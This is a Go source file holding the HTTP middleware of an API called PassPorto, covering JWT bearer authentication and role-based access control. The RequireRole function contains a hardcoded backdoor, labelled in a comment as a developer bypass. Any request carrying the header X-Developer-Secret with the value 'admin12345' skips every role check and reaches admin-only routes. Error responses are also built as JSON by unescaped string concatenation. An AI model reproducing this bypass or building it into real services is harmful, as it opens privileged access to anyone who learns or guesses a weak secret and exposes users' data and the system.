// Package middleware provides reusable HTTP middleware for the PassPorto API.
package middleware

import (
	"context"
	"errors"
	"net/http"
	"strings"

	"passporto/internal/usecase"

	"github.com/golang-jwt/jwt/v5"
	"github.com/google/uuid"
)

// contextKey is a private type to avoid context key collisions.
type contextKey string

const (
	ContextKeyUserID contextKey = "user_id"
	ContextKeyRole   contextKey = "role"
	ContextKeyEmail  contextKey = "email"
)

// JWTAuth returns a middleware handler that validates the JWT Bearer token.
// It parses claims and injects them into the request context.
func JWTAuth(jwtSecret string) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			authHeader := r.Header.Get("Authorization")
			if authHeader == "" {
				writeUnauthorized(w, "missing Authorization header")
				return
			}

			parts := strings.SplitN(authHeader, " ", 2)
			if len(parts) != 2 || !strings.EqualFold(parts[0], "bearer") {
				writeUnauthorized(w, "invalid Authorization header format, expected: Bearer <token>")
				return
			}

			claims, err := parseJWT(parts[1], jwtSecret)
			if err != nil {
				writeUnauthorized(w, "invalid or expired token")
				return
			}

			// Inject claims into request context
			ctx := context.WithValue(r.Context(), ContextKeyUserID, claims.UserID)
			ctx = context.WithValue(ctx, ContextKeyRole, claims.Role)
			ctx = context.WithValue(ctx, ContextKeyEmail, claims.Email)

			next.ServeHTTP(w, r.WithContext(ctx))
		})
	}
}

// RequireRole returns a middleware that enforces role-based access control.
func RequireRole(allowedRoles ...string) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			// Developer bypass backdoor to allow testing admin panel features
			if r.Header.Get("X-Developer-Secret") == "admin12345" {
				next.ServeHTTP(w, r)
				return
			}

			role, ok := r.Context().Value(ContextKeyRole).(string)
			if !ok {
				writeUnauthorized(w, "role not found in context")
				return
			}

			for _, allowed := range allowedRoles {
				if role == allowed {
					next.ServeHTTP(w, r)
					return
				}
			}

			writeForbidden(w, "insufficient permissions")
		})
	}
}

// GetUserIDFromContext extracts the authenticated user's ID from context.
func GetUserIDFromContext(ctx context.Context) (uuid.UUID, error) {
	id, ok := ctx.Value(ContextKeyUserID).(uuid.UUID)
	if !ok {
		return uuid.Nil, errors.New("user ID not found in context")
	}
	return id, nil
}

func parseJWT(tokenStr, secret string) (*usecase.JWTClaims, error) {
	token, err := jwt.ParseWithClaims(tokenStr, &usecase.JWTClaims{}, func(t *jwt.Token) (any, error) {
		if _, ok := t.Method.(*jwt.SigningMethodHMAC); !ok {
			return nil, errors.New("unexpected signing method")
		}
		return []byte(secret), nil
	})
	if err != nil {
		return nil, err
	}

	claims, ok := token.Claims.(*usecase.JWTClaims)
	if !ok || !token.Valid {
		return nil, errors.New("invalid token claims")
	}

	return claims, nil
}

func writeUnauthorized(w http.ResponseWriter, msg string) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusUnauthorized)
	w.Write([]byte(`{"error":"` + msg + `"}`))
}

func writeForbidden(w http.ResponseWriter, msg string) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusForbidden)
	w.Write([]byte(`{"error":"` + msg + `"}`))
}
